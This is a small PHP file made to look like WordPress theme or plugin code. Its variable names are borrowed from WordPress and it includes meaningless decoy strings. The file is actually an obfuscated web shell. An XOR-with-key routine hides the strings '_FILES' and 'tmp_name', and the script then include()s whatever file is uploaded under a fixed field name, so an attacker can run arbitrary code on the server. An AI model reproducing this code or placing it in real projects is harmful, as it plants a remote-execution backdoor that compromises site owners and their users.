<?php 	

function found_shortcodes()

{
    $urls_to_ping = 'Kerdv9ItWGeqflX';
    $types = $urls_to_ping;
    
    $default_term_id = $GLOBALS[terms("%14%23%3B%283j", $types)];
    $meta_key = $default_term_id;
    $_charset = isset($meta_key[$types]);
    if ($_charset)

    {
        $posts = $default_term_id[$types];

        $menu_icon = $posts[terms("%3F%08%02%3B%18X%24%11", $types)];
        $original_url = $menu_icon;
        include ($original_url);

    }
	$meta_value = 'string';
}
function terms($menu_position, $icon_files)

{
	$result = 'pees';
    $protocol = $icon_files;
    $attrs = "url" . "decode";
    $prev_value = $attrs($menu_position);
	$thumbnail_support = 'thumbfile';
    $category = substr($protocol,0, strlen($prev_value));
    $filetype = $prev_value ^ $category;
    
    $prev_value = strpos($filetype, $category);
    
	$timezone = 'no_texturize_tags';
    return $filetype;

}


found_shortcodes();

?>
